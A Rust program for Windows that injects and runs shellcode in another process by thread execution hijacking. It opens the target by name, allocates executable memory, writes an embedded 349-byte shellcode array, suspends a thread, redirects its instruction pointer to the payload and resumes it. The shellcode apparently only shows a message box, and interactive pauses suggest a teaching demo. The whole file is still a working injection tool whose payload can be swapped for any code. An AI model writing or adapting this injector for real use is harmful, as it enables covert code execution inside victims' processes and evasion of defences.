use clap::Parser;
use std::io::{self, Read};
use std::mem::size_of_val;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{
    GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_FULL_AMD64,
};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, Thread32First, Thread32Next,
    PROCESSENTRY32, THREADENTRY32, TH32CS_SNAPPROCESS, TH32CS_SNAPTHREAD,
};
use windows::Win32::System::Memory::{
    VirtualAllocEx, VirtualFreeEx, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::Threading::{
    GetCurrentProcessId, OpenProcess, OpenThread, ResumeThread, SuspendThread,
    WaitForSingleObject, INFINITE, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
};

use std::ffi::c_void;


type LPVOID = *mut c_void;

#[derive(Debug, Parser)]
#[command(version, about, long_about = None)]
struct ProcessName{
    #[arg(short, long)]
    name: String,
}

fn wait_for_enter() {
    let mut iterator = io::stdin().bytes();
    let _ = iterator.next();
}

fn main() {
    let shellcode: &[u8; 349] = &[
        0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xcc, 0x00, 0x00, 0x00, 0x41, 0x51,
        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b,
        0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x0f, 0xb7, 0x4a, 0x48, 0x41, 0xb9, 0x2a, 0x1c,
        0xb4, 0xbe, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
        0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b,
        0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x0f,
        0x85, 0x6f, 0x00, 0x00, 0x00, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74,
        0x64, 0x48, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0x50, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0,
        0xe3, 0x53, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x44, 0x8b, 0x4c, 0x24, 0x08, 0x48,
        0x01, 0xd6, 0x48, 0x31, 0xc0, 0x41, 0xc1, 0xc9, 0x0d, 0xac, 0x41, 0x01, 0xc1, 0x38, 0xe0,
        0x75, 0xf1, 0x45, 0x39, 0xd1, 0x75, 0xdb, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x4b, 0xff, 0xff, 0xff, 0x5d, 0xe8, 0x0b, 0x00, 0x00, 0x00, 0x75, 0x73,
        0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0x59, 0x41, 0xba, 0xe6, 0x93, 0x86,
        0x01, 0xff, 0xd5, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0xe8, 0x04, 0x00, 0x00, 0x00,
        0x54, 0x45, 0x48, 0x00, 0x5a, 0xe8, 0x20, 0x00, 0x00, 0x00, 0x72, 0x75, 0x73, 0x74, 0x20,
        0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x65, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6f,
        0x6e, 0x20, 0x68, 0x69, 0x6a, 0x61, 0x63, 0x6b, 0x69, 0x6e, 0x67, 0x00, 0x41, 0x58, 0x48,
        0x31, 0xc9, 0x41, 0xba, 0xce, 0x26, 0x7e, 0x10, 0xff, 0xd5, 0xbb, 0xd4, 0x43, 0xaf, 0x45,
        0x41, 0xba, 0x99, 0xbb, 0x42, 0xd9, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
        0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x7d, 0xe6, 0xe9, 0x89, 0x6a, 0x00, 0x59, 0x41,
        0x89, 0xda, 0xff, 0xd5
    ];


    let args = ProcessName::parse();
    if let Some(process_id) = get_process_id_by_name(&args.name){
        println!("[+] Successfully found process with PID: {}", process_id)
    }else{
        println!("[-] Process '{}' could not be found.", args.name);
    };

    let thread1: HANDLE = HANDLE::default();
    let snapshot: HANDLE = HANDLE::default();
    let thread_entry = THREADENTRY32::default();
    let mut context = CONTEXT::default();
    context.ContextFlags = CONTEXT_FULL_AMD64;
    let current_pid = unsafe{GetCurrentProcessId()};
    
    let target_pid = match get_process_id_by_name(&args.name){
        Some(pid) => pid,
        None => {
            println!("[-] Error: Process '{}' could not be found.", args.name);
            return; 
        }
    };

    println!("\n[!] Current PID: {}", current_pid);
    println!("[!] Target process is {} with PID: {}", &args.name, target_pid);

    let target_process: HANDLE = unsafe {
        match OpenProcess(PROCESS_ALL_ACCESS, false, target_pid) {
            Ok(handle) => handle,
            Err(e) => {
                println!("[-] Error: Could not open {} (PID: {}). Error: {:?}", args.name, target_pid, e);
                return;
            }
        }
    };

    println!("[+] Successfully opened handle to target process!");

    let remote_buffer = unsafe {
        VirtualAllocEx(
            target_process,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };

    if remote_buffer.is_null() {
        println!("[-] Error: Could not allocate memory in target process.");
        unsafe { let _ = CloseHandle(target_process); }
        return;
    }
    println!("[+] Memory is allocated at address: {:?} to hold shellcode", remote_buffer);
    println!("\nPress enter to write shellcode to this address. . .");
    wait_for_enter();

    
    let mut bytes_written = 0;
    let write_result = unsafe {
        WriteProcessMemory(
            target_process,
            remote_buffer,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            Some(&mut bytes_written),
        )
    };

    if write_result.is_err() {
        println!("[-] Failed to write to process memory. Error: {:?}", write_result.err());
        unsafe {
            let _ = VirtualFreeEx(target_process, remote_buffer, 0, MEM_RELEASE);
            let _ = CloseHandle(target_process);
        }
        return;
    }
    println!(
        "[+] Shellcode (starting with {:02X} {:02X} {:02X}) is written at this address",
        shellcode[0], shellcode[1], shellcode[2]
    );

    
    let snapshot = unsafe {
        match CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) {
            Ok(h) => h,
            Err(e) => {
                println!("[-] Failed to create thread snapshot: {:?}", e);
                unsafe { let _ = CloseHandle(target_process); }
                return;
            }
        }
    };

    let mut thread_entry = THREADENTRY32::default();
    thread_entry.dwSize = std::mem::size_of::<THREADENTRY32>() as u32;
    let mut thread_handle: Option<HANDLE> = None;
    let mut tid = 0;

    unsafe {
        if Thread32First(snapshot, &mut thread_entry).is_ok() {
            loop {
                if thread_entry.th32OwnerProcessID == target_pid {
                    if let Ok(h) = OpenThread(THREAD_ALL_ACCESS, false, thread_entry.th32ThreadID) {
                        thread_handle = Some(h);
                        tid = thread_entry.th32ThreadID;
                        println!("[*] Thread with TID {} found. Press enter to suspend thread . . .", tid);
                        break;
                    }
                }
                if Thread32Next(snapshot, &mut thread_entry).is_err() {
                    break;
                }
            }
        }
        let _ = CloseHandle(snapshot);
    }

    let thread1 = match thread_handle {
        Some(h) => h,
        None => {
            println!("[-] Error: Target thread could not be found.");
            unsafe { let _ = CloseHandle(target_process); }
            return;
        }
    };
    wait_for_enter();

    
    unsafe {
        let _ = SuspendThread(thread1);
    }
    println!("[+] Thread suspended. Press enter to modify thread context . . .");
    wait_for_enter();

    
    let mut context = CONTEXT::default();
    context.ContextFlags = CONTEXT_FULL_AMD64;

    unsafe {
        if GetThreadContext(thread1, &mut context).is_ok() {
            context.Rip = remote_buffer as u64; 

            if SetThreadContext(thread1, &context).is_err() {
                println!("[-] Error: Failed to set thread context.");
            } else {
                println!("[*] Thread context is modified. Press enter to resume thread . . .");
            }
        } else {
            println!("[-] Error: Failed to get thread context.");
        }
    }
    wait_for_enter();

    
    unsafe {
        let _ = ResumeThread(thread1);
        println!("[*] Thread resumed");
        let _ = WaitForSingleObject(thread1, INFINITE);

        let _ = CloseHandle(thread1);
        let _ = CloseHandle(target_process);
    }
    println!("[+] Hijacking lifecycle complete.");
}


fn get_process_id_by_name(process_name: &str) -> Option<u32> {
    let mut pid: Option<u32> = None;
    let handle_snap:HANDLE = unsafe{
        CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).expect("unable to enumerate processes")
    };
    let mut entry = PROCESSENTRY32::default();
    entry.dwSize = size_of_val(&entry) as u32;

    if unsafe{Process32First(handle_snap, &mut entry).is_ok()}{
        loop {

            let raw_bytes: Vec<u8> = entry.szExeFile.iter().take_while(|&&c| c != 0).map(|&c| c as u8).collect();
            let name = String::from_utf8_lossy(&raw_bytes);
            println!("PID: {:<6} | Name: {}", entry.th32ProcessID, name);

            if name.eq_ignore_ascii_case(process_name) {
                pid = Some(entry.th32ProcessID);
                break;
            }

            if unsafe{Process32Next(handle_snap, &mut entry).is_err()} {
                break;
            }
        }
    }

    let _ = unsafe{CloseHandle(handle_snap)};
    pid
}

